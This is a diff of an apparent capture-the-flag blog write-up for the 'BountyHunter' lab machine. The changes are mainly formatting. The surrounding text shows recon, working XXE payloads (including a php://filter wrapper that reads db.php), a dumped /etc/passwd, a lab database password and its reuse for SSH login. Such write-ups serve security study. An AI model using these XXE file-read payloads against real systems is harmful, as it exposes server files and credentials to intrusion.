@@ -19,20 +19,17 @@ First, i started with running [autorecon](https://github.com/Tib3rius/AutoRecon)
 Taking a look on the results of  [autorecon](https://github.com/Tib3rius/AutoRecon) it reveals two open ports, SSH (**22**) and HTTP (**80**).  
 ![nmap](/assets/img/blog/bhnmap.png)
 I manually visited the website on port 80, found a php script and started running `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://<ip> -x php`. It revealed following files and directories:
-|Path|Info  |
-|--|--|
-| /resources,/index.php,portal.php | accessible|
-| /assets, /js, /css| forbidden|
-| db.php | accessible blank page|
+
+`/resources,/index.php,portal.php,/assets, /js, /css, db.php`
 
 Next i manually checked the discovered directories and found a tasklist in `http://\<ip>/resources/README.txt` containing following text:
 
 > Tasks:
 > 
 > [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
->  [X] Write tracker submit script
->  [ ] Connect tracker submit script to the database
->   [X] Fix developer group permissions
+> [X] Write tracker submit script
+> [ ] Connect tracker submit script to the database
+> [X] Fix developer group permissions
 
 We should keep this information in mind. Also theres a file called `bountylog.js` containing JavaScript code. 
 
@@ -71,6 +68,7 @@ XML + Webrequest = [XXE](https://owasp.org/www-community/vulnerabilities/XML_Ext
     		<cvss>3</cvss>
     		<reward>4</reward>
     		</bugreport>
+
 In  Burp I moved to the Repeater and built my payload with the help of [this list](https://github.com/payloadbox/xxe-injection-payload-list).
 
     <?xml  version="1.0" encoding="ISO-8859-1"?>
@@ -81,6 +79,7 @@ In  Burp I moved to the Repeater and built my payload with the help of [this lis
     		<cvss>3</cvss>
     		<reward>4</reward>
     		</bugreport>
+
 Base64 and URL encoded i got the contents of the passwd file. 
 
     root:x:0:0:root:/root:/bin/bash
@@ -90,11 +89,13 @@ Base64 and URL encoded i got the contents of the passwd file.
     development:x:1000:1000:Development:/home/development:/bin/bash
     lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
     usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+
 So my XXE attack was successful. Unfortunately i couldn't read any other found files like `db.php` or `portal.php` in my expected web root direcotory at `/var/www/html/`. So i was looking for a different payload to avoid absolute paths and found an alternative payload on [hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file).
 
     <!--?xml version="1.0" ?-->
     <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/db.php"> ]>
     <data>&example;</data>
+
 It revealed the contents of db.php.
 
     <?php
@@ -105,6 +106,7 @@ It revealed the contents of db.php.
     $dbpassword = "m19RoAU0hP41A1sTsq6K";
     $testuser = "test";
     ?>
+
 Nice! So we got a database user and a password. Unfortunately i couldn't find anything else interesting so i moved to the ssh port. Previously we found a user named `development`in `/etc/passwd`, if we try `ssh development@<ip>` we are prompted for a password. We haven't found any password for this user so i just tried the password from the `db.php` file and .... it worked! 
 
     development@bountyhunter:~$ id   
